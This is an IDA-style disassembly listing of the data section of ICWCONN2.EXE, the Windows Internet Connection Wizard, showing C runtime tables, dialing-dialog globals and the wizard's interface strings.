		dd 4B000000h, 10003EA8h, 0FA4EC3h, 0F679451h, 1AC00090h
		dd 0DC948800h, 2C00h, 7F99008Ah, 7DAD919Bh, 688B0000h
		dd 5D7F2A00h, 200E84ADh, 4622C727h, 19D700C4h, 9D904300h
		dd 36F6717Eh, 9EBBBE69h, 46A04900h, 0B5BDDD32h,	0E74000h
		dd 0A4787000h, 0BC6F009Dh, 0C80043ACh, 0DD000044h, 68BAC373h
		dd 0F8F6FB2h, 5B84B7BBh, 0E300ED02h, 41FCFEDDh,	0A8A3C5h
		dd 1731F92Ch, 1FF45AB5h, 12DC0001h, 539D7779h, 98008Ch
		dd 915310h, 0DB00h, 0DE222E00h,	95001C73h, 25D9B6C2h, 4F302100h
		dd 91D82C29h, 0ED0079B2h, 2AAF3FCBh, 0BF00EC0Dh, 0F7E38Bh
		dd 749CFAD7h, 2D4D2700h, 55AAF7h, 77004B8Fh, 1AD630A4h
		dd 1CE15C00h, 0E6FDE2D7h, 0FA1E0000h, 3FBE194Eh, 4176AAB5h
		dd 478DF1F4h, 0FE0C00h,	80000B4h, 91F8A741h, 121571E7h
		dd 61817A46h, 5CD0D000h, 6ADC0Ch, 1C305F14h, 900D534h
		dd 0BEDA00D9h, 9B0037D7h, 0F39F9058h, 4C2Ah, 0C8EC60h
		dd 0F4E2EA59h, 0B600D81Dh, 0E70CC1h, 0E389FFAAh, 15D6EDDEh
		dd 8B00FBBFh, 0C9B179h,	31818C8h, 0AA8719E0h, 3F88939Bh
		dd 59FAEAh, 3952009Dh, 0DE001032h, 8663C3Dh, 4E862CCFh
		dd 0EA210000h, 0E37A39h, 6A431Fh, 88C77400h, 0D70000CBh
		dd 0B3B12A79h, 0C393E9h, 8500AAB9h, 8800F4h, 32BE04h, 8C9F00h
		dd 0AC400CFh, 0FC7933EDh, 916D6434h, 0EF009028h, 82E61AF1h
		dd 7667BECBh, 0FCCD0000h, 0C10062h, 8F00A125h, 3EB7D61h
		dd 13CECh, 0F56D0692h, 511A00E7h, 0E6CFB0B9h, 0F8840052h
		dd 1AF729C0h, 0AF08F1C5h, 0D660009Ch, 0EFD5BF00h, 9332080Ch
		dd 2E38EB00h, 0AF00347Dh, 240518B4h, 0E09Ch, 6B54407Fh
		dd 120EBC41h, 0D8AFh, 0EBD07371h, 7D016B00h, 60004DB2h
		dd 0B869C606h, 596300h,	0FA1AC5h, 5DA4E20Ah, 54FFA7h, 480029h
		dd 95780D27h, 659A2E58h, 0C5B7F33Bh, 0C1D4h, 0D5B88785h
		dd 86002E54h, 6F24C7FEh, 0D36AD052h, 1EFh, 0DBE68Ah, 645D0A21h
		dd 130B5657h, 900600h, 76F55000h, 38001500h, 20A49200h
		dd 0D23C2E3Eh, 5D73CBh,	776F4451h, 0C5140022h, 5E0E8306h
		dd 0AF00D0h, 0BC385EEDh, 0D87F604Eh, 817E31DDh,	0E0C5003Fh
		dd 34007AB8h, 789500h, 93000000h, 13AD00h, 0A95CF3FBh
		dd 5BD72C00h, 4DE0989Bh, 0B80022h, 0D7BA0094h, 958B66h
		dd 5B13CE5Dh, 0F2EC0E00h, 0B2BD3D00h, 362A00CEh, 69196BE7h
		dd 0C1CF191Ah, 0B13053F2h, 0D900C8CDh, 0ED008653h, 17C7002Ah
		dd 0AF74h, 0C1EB63h, 5DE2ABh, 4B0000A9h, 1BFF88F2h, 66FE1Ch
		dd 5F00BCh, 3D62007Fh, 773D1C00h, 0F211A411h, 0CC006F00h
		dd 8E00B5B7h, 38159C46h, 7A8EE425h, 5008731Dh, 7D00CD00h
		dd 9E006300h, 94613Eh, 0AEF32Bh, 0E215590Bh, 7DF2006Bh
		dd 0DA1A3784h, 0D811A2h, 731C6Eh, 7D0C000Dh, 6D003059h
		dd 9D604C00h, 7A002186h, 1631F3h, 0A4200000h, 0D7E200B2h
		dd 0B800DFB5h, 7B3A59h,	37CE230Eh, 5A690060h, 0E12AAC00h
		dd 2E883C5h, 370E9h, 0B7D300h, 89000B92h, 0A0001977h, 395FB158h
		dd 52854D91h, 5F330D00h, 0C3BF59B1h, 0B5940086h, 0FE000EFDh
		dd 4E2DF73Fh, 43000F1h,	0B029C140h, 0D8B0D000h,	57690000h
		dd 0CAEAh, 6864F580h, 0AD1F403Eh, 9D00DC86h, 54567EFBh
		dd 31558FD5h, 9CFDF608h, 18C34A00h, 5D70CE92h, 66C9903Ah
		dd 20002Ch, 33AE2369h, 0C58044h, 17D0DF6Bh, 0FFDC0000h
		dd 0EFE500h, 0A100EC2Bh, 0AB70D98Dh, 0E8AF8Ah, 0E1EC3Bh
		dd 0EC6D53BFh, 0D8DE0085h, 0F00027B1h, 748FB200h, 0B6359E00h
		dd 4A003490h, 92213F47h, 8EF1E06Bh, 0C7597573h,	0C44E6CE5h
		dd 0A1D30000h, 73716100h, 1AF1C525h, 9913h, 62A2A700h
		dd 199F43h, 0B50052E5h,	0F8BE82C9h, 4500CB2Ch, 44190095h
		dd 2EF6007Bh, 790027D5h, 9196008Ch, 47000562h, 3CD8BEECh
		dd 6CA44E24h, 17002A45h, 1B36D981h, 7915ADABh, 0D4969160h
		dd 0DD37F7h, 73FDA943h,	0C26D4565h, 0E44500DCh,	558B001Bh
		dd 307BBDh, 379626h, 1F00ECA5h,	8A221787h, 0E7E6B8h, 9DC51332h
		dd 0C4717D9Dh, 8375522h, 80982700h, 94730CA2h, 4EDB2E9Ah
		dd 3F00FD30h, 0D231h, 48FFh, 213A244h, 0B41E0000h, 6B87FBFh
		dd 2DBBCD00h, 13DC00h, 262E5014h, 0D7FAEBh, 0FD3000CBh
		dd 20000426h, 2F766BDCh, 26AEh,	0CEA50079h, 6DA36A35h
		dd 41C600BBh, 9200004Fh, 1F48C400h, 8000A714h, 87CCCC5h
		dd 64A7B504h, 3EA47CF2h, 0F812001Bh, 95001C9Ch,	59007DCAh
		dd 0BEB4EB9Ah, 0D59BB697h, 96E6B786h, 0F1008A4Eh, 9CCE13F1h
		dd 2B1530h, 308F00h, 0F261E800h, 0A96C007Ah, 0D3B473h
		dd 0FA34A422h, 7FF8BDh,	0F7DB0000h, 0D0D29783h,	0E153A01Eh
		dd 1874006Fh, 0CC862C4Bh, 96FAFF63h, 59DB9A00h,	1998h
		dd 25009Fh, 3700C59Dh, 0FED06B00h, 2C00B202h, 3B7B30B0h
		dd 0DB9A9Ah, 569D2FEEh,	367Bh, 2087F4h,	0BEh, 6200D8A0h
		dd 0CCFD5345h, 0A41FD9h, 0D3D9C6h, 2000FE71h, 0FF275F00h
		dd 0D0A700DFh, 0B0F8ADA2h, 68D30030h, 1300556Eh, 38FB42FAh
		dd 0D98F7811h, 27E37E29h, 1F0022D2h, 0B000F22Ch, 0F649F5B8h
		dd 0FD93E9D5h, 0FC3FFFFh, 34000000h, 0BE00h, 8AD1E300h
		dd 0A3E0B74Eh, 0C282E1A8h, 0F9E73500h, 0C6EE6FECh, 0E900F58Ch
		dd 3F7900h, 9AEE5396h, 0BF000049h, 79143CDDh, 4A004F82h
		dd 0F1002C84h, 11AA7400h, 59B01913h, 0BDA00h, 0FF1CFC8Dh
		dd 0A8009C00h, 9C8100h,	0F4332EB3h, 0CE38003Bh,	0A8E00h
		dd 0C22AF732h, 712A3h, 0B772E778h, 0EE4B00C6h, 95C67889h
		dd 87050080h, 0B39D221Bh, 6Fh, 62E30055h, 0D187h, 0E5006E00h
		dd 0DD260300h, 6E83A659h, 0F7AED7AAh, 0EB003800h, 0CD7EF362h
		dd 0BBD8F476h, 0B1A9DACAh, 63F7DD82h, 0D86D3230h, 592DA600h
		dd 41F6h, 0B63F5E97h, 0DA7054B4h, 64E70000h, 0FD7166h
		dd 0AE0ABFA9h, 5A540Bh,	0DD84664Ch, 4B002Fh, 0B804848Ch
		dd 843573C7h, 40F7h, 0DC0000h, 0F688CDD3h, 9C00EA4Ah, 0D53A2AC9h
		dd 0FB001D00h, 8AFE519Dh, 270097DFh, 0E598DD64h, 0D25B9DF3h
		dd 9ABC3941h, 8DD78B16h, 0ABEEFF8Fh, 98D0F39h, 91FFFFF9h
		dd 0CA81F231h, 11045A67h, 1117AE9h, 8A008100h, 887100DEh
		dd 5C52CA24h, 0AEE00000h, 0F5650000h, 93006847h, 649D12E4h
		dd 8AD6100h, 72A9DEh, 764FF4B5h, 0F561008Bh, 0A4F0F5Dh
		dd 130C21A0h, 10354423h, 0C245h, 4E7C0100h, 0F0DACCE1h
		dd 90754AE2h, 0E435ED6Bh, 0CF0010h, 8C38837Ah, 0ABFB8C98h
		dd 0D79B4119h, 0CC06996Ah, 141B8000h, 43EF007Ah, 645381h
		dd 0C100AF00h, 1B00F900h, 4A30E200h, 0CF20D7h, 45AFFD70h
		dd 88397244h, 40CB2E32h, 3E4B62h, 3D00AF89h, 81FC00DDh
		dd 8E0077D0h, 9D0097h, 95002ED5h, 0D1140000h, 195F700h
		dd 3BF5FBh, 30F2701Dh, 2000BC92h, 0A3C581F7h, 0CE290002h
		dd 876F0000h, 56A631h, 41007D00h, 38C773D7h, 0A400C026h
		dd 26003D2Dh, 0F8A58906h, 0DCC32E00h, 0C5777782h, 5AFD5C77h
		dd 82E43900h, 87000000h, 1FC0h,	0D8A53B6Fh, 0C2E5E36Eh
		dd 0B900E9FBh, 26006E9Ch, 0C31D74F5h, 4C0D0074h, 5E02C86Fh
		dd 3ABCF292h
		dd 596A0057h, 7AC73518h, 0B13C00A1h, 9973A243h,	0DD0FEF17h
		dd 6A1D4E00h, 33795036h, 2603D887h, 0D23895D6h,	9D006700h
		dd 0C6390600h, 0FC61F194h, 0D30571B5h, 6C6825F6h, 3122FE95h
		dd 0EC2E1315h, 791300h,	6F3778B9h, 0B0006500h, 0D3DF2B00h
		dd 0FF0032h, 826D16h, 3B59E993h, 0D4CE50F5h, 24E6C400h
		dd 77C732C5h, 266Ch, 4363FE6Fh,	26D5485Ch, 0F93F6600h
		dd 8Dh,	600EFF7h, 58F081Ah, 68729B2h, 6F40A7h, 12B71B00h
		dd 4169EA02h, 0C0F01D00h, 0FD3795F7h, 8900412Bh, 744C0CC2h
		dd 0E6007E6Fh, 0E5F1E9A9h, 70D08800h, 76000000h, 227268E2h
		dd 7002700h, 148178E3h,	4D4B6327h, 0E254h, 2B005BBDh, 0F3818B86h
		dd 1929424Ch, 69570E5h,	0AE00007Dh, 0BA003D4Ah,	0A7D00h
		dd 54079400h, 0ED6C000Ch, 987B0053h, 1200EDE4h,	1BF2287Ah
		dd 27700CFFh, 3DBBDE47h, 48D5E2B8h, 1B74DA41h, 0EDCD4Dh
		dd 3A00AB30h, 5F00E1E5h, 16284FACh, 49009A00h, 0B6572211h
		dd 0D3BDE8h, 341185h, 0CFAADBh,	1CFFA7C5h, 15192137h, 0ECC60075h
		dd 2E3E784Eh, 0ACEC00h,	5355h, 8500002Dh, 5DB2BF00h, 9
		dd 0F900B8h, 0AF2C75h, 355800h,	1BD42000h, 0E6h, 70F1859h
		dd 0B0073BAh, 9136B1h, 0AB00EA0Ah, 767C6475h, 528A31CBh
		dd 3CC7F9C7h, 0AAA74F4Bh, 69BF5A1Bh, 9133E475h,	0C4B347h
		dd 1F00953Ah, 0CCA7h, 0C870ACh,	0F1FB306h, 0D100919Eh
		dd 0B2E428h, 0F1C70014h, 2EE900h, 8DC75Ah, 9DF50068h, 70C4CDh
		dd 906C9Ah, 0A21644FCh,	8233525Fh, 0CC00A7h, 24A38130h
		dd 8F00D82Fh, 60C8BBh, 0B32D1D24h, 0CEFA3176h, 0B30A3C00h
		dd 7C008300h, 0C19869DFh, 0B8h,	4 dup(0)
		dd 0DB003800h, 0E5008EDBh, 9A5A3500h, 3B00DFh, 0A800A0A1h
		dd 5A6B5DB0h, 7200C39Eh, 4C009875h, 4D006E15h, 0AA4478E2h
		dd 2725A2h, 4CF10000h, 0DB00756Ah, 6300AF99h, 90C17178h
		dd 18E9018Ah, 16674310h, 8F3D3900h, 0C4006EBFh,	0D6D58C5h
		dd 1E943696h, 6800C4h, 9D20DAh,	0E4882800h, 0A3006Bh, 103h dup(0)
_text		ends

; Section 2. (virtual address 0000E000)
; Virtual size			: 00003C58 (  15448.)
; Section size in file		: 00001000 (   4096.)
; Offset to raw	data for section: 0000E000
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 100E000h
___xc_a		dd 0			; DATA XREF: __cinit+3Bo
		dd offset ___security_init_cookie
___xc_z		dd 0			; DATA XREF: __cinit:loc_100718Do
___xi_a		dd 0			; DATA XREF: __cinit+Co
		dd offset ___initmbctable
		dd offset ___initstdio
___xi_z		dd 0			; DATA XREF: __cinit+11o
___xp_a		dd 0			; DATA XREF: sub_10071A7+5Bo
		dd offset ___endstdio
___xp_z		dd 0			; DATA XREF: sub_10071A7:loc_10071FDo
___xt_a		dd 0			; DATA XREF: sub_10071A7+6Bo
___xt_z		dd 0			; DATA XREF: sub_10071A7:loc_100720Do
; unsigned short * szValidPhoneCharacters
?szValidPhoneCharacters@@3PAGA dd 310030h ; DATA XREF: DialErrDlgProc(x,x,x,x):loc_100475Ar
					; DialErrDlgProc(x,x,x,x)+58Do
a23456789aabbcc:
		unicode	0, <23456789AaBbCcDdPpTtWw!@$ -.()+*#,&>,0
		align 10h
dword_100E080	dd 1			; DATA XREF: DialErrDlgProc(x,x,x,x)+18Er
					; DialErrDlgProc(x,x,x,x)+4D6w
___security_cookie_complement dd 0FFFF953Dh ; DATA XREF: ___security_init_cookie+67w
					; ___report_gsfailure+C6r
___security_cookie dd 6AC2h		; DATA XREF: .text:off_100388Co
					; IsNT(void)+Br ...
__aexit_rtn	dd offset __exit	; DATA XREF: __amsg_exit+20r
___app_type	dd 2			; DATA XREF: __NMSG_WRITE+53r
					; __FF_MSGBANNER+Er ...
		align 8
dword_100E098	dd 43h			; DATA XREF: sub_1006C05:loc_1006E5Co
					; .data:off_100E1E8o ...
dword_100E09C	dd 0			; DATA XREF: sub_1006C05+14Ao
					; sub_1006C05+188w ...
dword_100E0A0	dd 1			; DATA XREF: sub_1006C05+191w
					; sub_1006C05+1E5w ...
		dd 6 dup(0)
dword_100E0BC	dd 0			; DATA XREF: sub_1006C05+132r
dword_100E0C0	dd 0			; DATA XREF: sub_1006C05+138r
dword_100E0C4	dd 0			; DATA XREF: sub_1006C05+16Co
byte_100E0C8	db 43h			; DATA XREF: __expandlocale+A7o
					; __expandlocale+14Cw
		align 4
		dd 21h dup(0)
byte_100E150	db 43h			; DATA XREF: __expandlocale+72o
					; __expandlocale+121o ...
		align 4
		dd 21h dup(0)
___lc_category	dd offset aLc_all	; "LC_ALL"
; void *Memory
Memory		dd 0			; DATA XREF: sub_1006959+7r
					; sub_1006959+24w ...
off_100E1E0	dd offset ___init_collate ; DATA XREF: sub_1006C05:loc_1006E1Dr
off_100E1E4	dd offset aLc_collate	; DATA XREF: sub_1006959+3Er
					; _setlocale+C3o
					; "LC_COLLATE"
off_100E1E8	dd offset dword_100E098	; DATA XREF: sub_1006959+33r
					; sub_1006959+51o
		dd offset ___init_collate
		dd offset aLc_ctype	; "LC_CTYPE"
off_100E1F4	dd offset dword_100E098	; DATA XREF: sub_1006959+F5r
		dd offset ___init_ctype
		dd offset aLc_monetary	; "LC_MONETARY"
		dd offset dword_100E098
		dd offset ___init_monetary
		dd offset aLc_numeric	; "LC_NUMERIC"
		dd offset dword_100E098
		dd offset ___init_numeric
off_100E214	dd offset aLc_time	; DATA XREF: _setlocale+FFo
					; "LC_TIME"
off_100E218	dd offset dword_100E098	; DATA XREF: sub_1006959+CBo
					; _setlocale+21Ao
		dd offset ___init_time
dword_100E220	dd 2			; DATA XREF: __NMSG_WRITE:loc_10072B9r
					; __NMSG_WRITE+2Fr
off_100E224	dd offset aR6002FloatingP ; DATA XREF: __NMSG_WRITE+F4r
					; __NMSG_WRITE+164r ...
					; "R6002\r\n- floating point not loaded\r\n"
		dd 8, 10022B4h,	9, 1002288h, 0Ah, 10021F0h, 10h, 10021C0h
		dd 11h,	1002190h, 12h, 100216Ch, 13h, 1002140h,	18h, 1002108h
		dd 19h,	10020E0h, 1Ah, 10020A8h, 1Bh, 1002070h,	1Ch, 1002048h
		dd 78h,	1002038h, 79h, 1002028h, 7Ah, 1002018h,	0FCh, 1002014h
		dd 0FFh, 1002004h
__XcptActTab	dd 0C0000005h, 0Bh, 0	; DATA XREF: __XcptFilter+Eo
		dd 0C000001Dh, 4, 0
		dd 0C0000096h, 4, 0
		dd 0C000008Dh, 8, 0
		dd 0C000008Eh, 8, 0
		dd 0C000008Fh, 8, 0
		dd 0C0000090h, 8, 0
		dd 0C0000091h, 8, 0
		dd 0C0000092h, 8, 0
		dd 0C0000093h, 8, 0
__First_FPE_Indx dd 3			; DATA XREF: __XcptFilter+86r
__Num_FPE	dd 7			; DATA XREF: __XcptFilter+8Br
__XcptActTabCount dd 0Ah		; DATA XREF: __XcptFilter+8r
; int _fpecode
__fpecode	dd 8Ch			; DATA XREF: __XcptFilter+B4r
					; __XcptFilter+BCw ...
___badioinfo	dd 0FFFFFFFFh, 0A80h
; unsigned int _amblksiz
__amblksiz	dd 10h
		align 10h
___lc_clike	dd 1			; DATA XREF: _toupper+18r
					; sub_1006C05+202w ...
; const	unsigned __int16 *_pctype
__pctype	dd offset word_100239A	; DATA XREF: _toupper:loc_10066DCr
					; _toupper:loc_10066ECr ...
; const	wctype_t *_pwctype
__pwctype	dd offset word_10025A2
; int __mb_cur_max
___mb_cur_max	dd 1			; DATA XREF: _toupper+32r _tolower+38r ...
___decimal_point db 2Eh			; DATA XREF: ___init_numeric+135w
		align 4
___decimal_point_length	dd 1		; DATA XREF: ___init_numeric+13Aw
		align 10h
byte_100E370	db 1			; DATA XREF: __setmbcp+122r
		db 2, 4, 8
		align 8
dword_100E378	dd 3A4h			; DATA XREF: __setmbcp:loc_100A1D0r
aVyv		db '`y!',0            ; DATA XREF: __setmbcp+15Eo
		align 8
aJ		db '',0               ; DATA XREF: __setmbcp+102o
		align 10h
aBe		db '',0
		align 8
		dd 0FCE09F81h, 0
		dd 0FC807E40h, 0
		dd 3A8h, 0A3DAA3C1h, 20h, 5 dup(0)
		dd 0FE81h, 0
		dd 0FE40h, 0
		dd 3B5h, 0A3DAA3C1h, 20h, 5 dup(0)
		dd 0FE81h, 0
		dd 0FE41h, 0
		dd 3B6h, 0A2E4A2CFh, 0A2E5001Ah, 5BA2E8h, 4 dup(0)
		dd 0FE81h, 0
		dd 0FEA17E40h, 0
		dd 551h, 0DA5EDA51h, 0DA5F0020h, 32DA6Ah, 4 dup(0)
		dd 0DED8D381h, 0F9E0h, 0FE817E31h, 0
__NLG_Destination dd 19930520h,	3 dup(0) ; DATA	XREF: __NLG_Notify1+2o
					; __NLG_Notify+2o
; FILE _iob[]
__iob		dd offset __bufin	; DATA XREF: ___initstdio+52o
		align 10h
		dd offset __bufin
		dd 101h
dword_100E488	dd 2 dup(0)		; DATA XREF: ___initstdio+71o
		dd 1000h, 4 dup(0)
		dd 2, 1, 6 dup(0)
		dd 2 dup(2), 7 dup(0)
dword_100E4E8	dd 84h dup(0)		; DATA XREF: ___initstdio+9Ao
___nullstring	dd offset aNull_0	; DATA XREF: ___initstdio+67o
					; "(null)"
___wnullstring	dd offset aNull		; "(null)"
__cfltcvt_tab	dd offset __fptrap
		dd offset __fptrap
		dd offset __fptrap
		dd offset __fptrap
		dd offset __fptrap
		dd offset __fptrap
		align 10h
___lc_time_curr	dd offset ___lc_time_c	; DATA XREF: ___init_time+41w
					; ___init_time+65w
		align 8
___lc_time_c	dd offset aSun		; DATA XREF: ___init_time+65o
					; .data:___lc_time_curro
					; "Sun"
		dd offset aMon		; "Mon"
		dd offset aTue		; "Tue"
		dd offset aWed		; "Wed"
		dd offset aThu		; "Thu"
		dd offset aFri		; "Fri"
		dd offset aSat		; "Sat"
		dd offset aSunday	; "Sunday"
		dd offset aMonday	; "Monday"
		dd offset aTuesday	; "Tuesday"
		dd offset aWednesday	; "Wednesday"
		dd offset aThursday	; "Thursday"
		dd offset aFriday	; "Friday"
		dd offset aSaturday	; "Saturday"
		dd offset aJan		; "Jan"
		dd offset aFeb		; "Feb"
		dd offset aMar		; "Mar"
		dd offset aApr		; "Apr"
		dd offset aMay		; "May"
		dd offset aJun		; "Jun"
		dd offset aJul		; "Jul"
		dd offset aAug		; "Aug"
		dd offset aSep		; "Sep"
		dd offset aOct		; "Oct"
		dd offset aNov		; "Nov"
		dd offset aDec		; "Dec"
		dd offset aJanuary	; "January"
		dd offset aFebruary	; "February"
		dd offset aMarch	; "March"
		dd offset aApril	; "April"
		dd offset aMay		; "May"
		dd offset aJune		; "June"
		dd offset aJuly		; "July"
		dd offset aAugust	; "August"
		dd offset aSeptember	; "September"
		dd offset aOctober	; "October"
		dd offset aNovember	; "November"
		dd offset aDecember	; "December"
		dd offset aAm		; "AM"
		dd offset aPm		; "PM"
		dd offset aMmDdYy	; "MM/dd/yy"
		dd offset aDdddMmmmDdYyyy ; "dddd, MMMM	dd, yyyy"
		dd offset aHhMmSs	; "HH:mm:ss"
		dd 409h, 1
___lconv_static_decimal	dd 2Eh		; DATA XREF: .data:___lconv_co
___lconv_c	dd offset ___lconv_static_decimal ; DATA XREF: ___free_lconv_num+Fr
					; ___init_numeric+31o ...
off_100E7E4	dd offset ___lconv_static_null ; DATA XREF: ___free_lconv_num+21r
					; ___init_numeric+FFr
off_100E7E8	dd offset ___lconv_static_null ; DATA XREF: ___free_lconv_num+33r
					; ___init_numeric+107r
off_100E7EC	dd offset ___lconv_static_null ; DATA XREF: ___free_lconv_mon+10r
off_100E7F0	dd offset ___lconv_static_null ; DATA XREF: ___free_lconv_mon+22r
off_100E7F4	dd offset ___lconv_static_null ; DATA XREF: ___free_lconv_mon+34r
off_100E7F8	dd offset ___lconv_static_null ; DATA XREF: ___free_lconv_mon+46r
off_100E7FC	dd offset ___lconv_static_null ; DATA XREF: ___free_lconv_mon+58r
off_100E800	dd offset ___lconv_static_null ; DATA XREF: ___free_lconv_mon+6Ar
off_100E804	dd offset ___lconv_static_null ; DATA XREF: ___free_lconv_mon+7Cr
		dd 2 dup(7F7F7F7Fh)
___lconv	dd offset ___lconv_c	; DATA XREF: ___init_numeric+1Br
					; ___init_numeric:loc_1008B5Cr	...
		align 10h
dword_100E820	dd 1			; DATA XREF: __dosmaperr:loc_100BC79r
dword_100E824	dd 16h			; DATA XREF: __dosmaperr:loc_100BC9Er
		dd 2 dup(2), 3,	2, 4, 18h, 5, 0Dh, 6, 9, 7, 0Ch, 8, 0Ch
		dd 9, 0Ch, 0Ah,	7, 0Bh,	8, 0Ch,	16h, 0Dh, 16h, 0Fh, 2
		dd 10h,	0Dh, 11h, 2 dup(12h), 2, 21h, 0Dh, 35h,	2, 41h
		dd 0Dh,	43h, 2,	50h, 11h, 52h, 0Dh, 53h, 0Dh, 57h, 16h
		dd 59h,	0Bh, 6Ch, 0Dh, 6Dh, 20h, 70h, 1Ch, 72h,	9, 6, 16h
		dd 80h,	0Ah, 81h, 0Ah, 82h, 9, 83h, 16h, 84h, 0Dh, 91h
		dd 29h,	9Eh, 0Dh, 0A1h,	2, 0A4h, 0Bh, 0A7h, 0Dh, 0B7h
		dd 11h,	0CEh, 2, 0D7h, 0Bh, 718h, 0Ch
; __int32 _timezone
__timezone	dd 7080h
; int _daylight
__daylight	dd 1
; __int32 _dstbias
__dstbias	dd 0FFFFF1F0h
		align 8
dword_100E998	dd 545350h, 0Fh	dup(0)	; DATA XREF: .data:__tznameo
dword_100E9D8	dd 544450h, 0Fh	dup(0)	; DATA XREF: .data:__tznameo
; char *_tzname[2]
__tzname	dd offset dword_100E998, offset	dword_100E9D8
		dd 0FFFFFFFFh, 2 dup(0)
		dd 0FFFFFFFFh, 4 dup(0)
__lpdays	dd 0FFFFFFFFh, 1Eh, 3Bh, 5Ah, 78h, 97h,	0B5h, 0D4h, 0F3h
		dd 111h, 130h, 14Eh, 16Dh
__days		dd 0FFFFFFFFh, 1Eh, 3Ah, 59h, 77h, 96h,	0B4h, 0D3h, 0F2h
		dd 110h, 12Fh, 14Dh, 16Ch, 6 dup(0)
___@@_PchSym_@00@UckhkignUrmvgxlivUxlmmvxgrlmdraziwUrxdxlmmCUfmrxlwvUlyqUrDIGUkxsOlyq@ICWCONN2 dd 0
; struct HWND__	* hwndFound
?hwndFound@@3PAUHWND__@@A dd 0
; unsigned long	dwRASWndTitleMinLen
?dwRASWndTitleMinLen@@3KA dd 0
; int fInAssert
?fInAssert@@3HA	dd 0
; HGLOBAL g_pdevice
?g_pdevice@@3PAUtagDEVICE@@A dd	0	; DATA XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+8r
					; ShowDialingDialog(ushort *,tagGATHEREDINFO *,ushort *,HINSTANCE__ *,HWND__ *,ushort *)+21w ...
; struct tagDialDlg * g_pcPDLG
?g_pcPDLG@@3PAUtagDialDlg@@A dd	0
; struct HWND__	* g_hDialDlgWnd
?g_hDialDlgWnd@@3PAUHWND__@@A dd 2 dup(0)
; unsigned short * szBuf256
?szBuf256@@3PAGA dd 80h	dup(0)
; int g_iMyMaxPhone
?g_iMyMaxPhone@@3HA dd 0		; DATA XREF: DialErrDlgProc(x,x,x,x)+A5w
; LPARAM g_pcDialErr
?g_pcDialErr@@3PAUtagDialErr@@A	dd 0	; DATA XREF: HelpKybdHookProc(int,uint,long)+13r
					; FillModems(void)+1Br	...
; HHOOK	hhk
hhk		dd 0			; DATA XREF: HelpKybdHookProc(int,uint,long):loc_1003B33r
					; DialErrDlgProc(x,x,x,x)+187w	...
; HOOKPROC lpfn
lpfn		dd 0			; DATA XREF: DialErrDlgProc(x,x,x,x)+160w
					; DialErrDlgProc(x,x,x,x)+179r
dword_100ECF0	dd 0			; DATA XREF: DialErrDlgProc(x,x,x,x)+4DCw
					; DialErrDlgProc(x,x,x,x):loc_10046FCr
dword_100ECF4	dd 0			; DATA XREF: DialErrDlgProc(x,x,x,x):loc_1004381w
					; DialErrDlgProc(x,x,x,x)+466r
dword_100ECF8	dd 0			; DATA XREF: DialErrDlgProc(x,x,x,x)+BEw
					; DialErrDlgProc(x,x,x,x)+D1w ...
		align 10h
; int iSzTable
?iSzTable@@3HA	dd 2			; DATA XREF: GetSz(ushort)+6r
					; GetSz(ushort)+15w ...
		align 8
; unsigned short (* szStrTable)[256]
?szStrTable@@3PAY0BAA@GA:		; DATA XREF: GetSz(ushort)+Fo
		unicode	0, <Internet Connection	Wizard>,0
		align 10h
		dd 72h dup(0)
aTheInternetCon:
		unicode	0, <The	Internet Connection Wizard cannot be started using >
		dw 27h
		unicode	0, <ICWCONN2.EXE>
		dw 27h
		unicode	0, <.>
		dw 2 dup(0Ah)
		unicode	0, <To start the wizard, choose	the Connection Wizard ic>
		dd 1C2h	dup(?)
; int g_bINSFileExists
?g_bINSFileExists@@3HA dd ?		; DATA XREF: WinMain(x,x,x,x)+C4w
					; WinMain(x,x,x,x)+DDw	...
; int g_bProgressBarVisible
?g_bProgressBarVisible@@3HA dd ?	; DATA XREF: WinMain(x,x,x,x)+72w
; unsigned long	g_fNeedReboot
?g_fNeedReboot@@3KA dd ?		; DATA XREF: ParseCommandLine(ushort *)+2Cw
					; CallDownLoad(ushort *,HINSTANCE__ *):loc_1005E1Er
; unsigned long	dwDownLoad
?dwDownLoad@@3KA dd ?			; DATA XREF: WinMain(x,x,x,x)+6Cw
; unsigned long	dwThreadID
?dwThreadID@@3KA dd ?
; void * hThread
?hThread@@3PAXA	dd ?
; WCHAR	szBuff256
?szBuff256@@3PAGA dw ?			; DATA XREF: DoneDlgProc(x,x,x,x)+64o
					; DoneRebootDlgProc(x,x,x,x)+62o ...
		align 4
		dd 7Fh dup(?)
; int fUserCanceled
?fUserCanceled@@3HA dd ?		; DATA XREF: WinMain(x,x,x,x)+66w
; struct HBRUSH__ * hbBackBrush
?hbBackBrush@@3PAUHBRUSH__@@A dd ?
; struct tagRECT rect
?rect@@3UtagRECT@@A dd 4 dup(?)
; struct _ShowProgressParams SPParams
?SPParams@@3U_ShowProgressParams@@A dd ?
dword_100F93C	dd ?			; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *)+10Bw
dword_100F940	dd ?			; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *)+111w
dword_100F944	dd ?			; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *)+F5w
		dd ?
; unsigned int uiSetupClientNewPhoneCall
?uiSetupClientNewPhoneCall@@3IA	dd ?	; DATA XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+A1r
					; CallDownLoad(ushort *,HINSTANCE__ *)+20Cr ...
; WCHAR	pszSetupClientURL
?pszSetupClientURL@@3PAGA dw ?		; DATA XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+8Bo
					; WinMain(x,x,x,x)+42o	...
		align 4
		dd 1EBh	dup(?)
dword_1010100	dd 14h dup(?)		; DATA XREF: ___from_strstr_to_strchr+5Do
; HRASCONN hrasconn
?hrasconn@@3PAUHRASCONN__@@A dd	?	; DATA XREF: FindCurrentConn(void)+AFw
					; FindCurrentConn(void):loc_100561Br ...
		align 8
; const	WCHAR pszFinalConnectoid
?pszFinalConnectoid@@3PAGA dw ?		; DATA XREF: FindCurrentConn(void)+6Fr
					; FindCurrentConn(void):loc_10055EFo ...
		align 4
		dd 83h dup(?)
; const	WCHAR pszINSFileName
?pszINSFileName@@3PAGA dw ?		; DATA XREF: DoneDlgProc(x,x,x,x)+5Ao
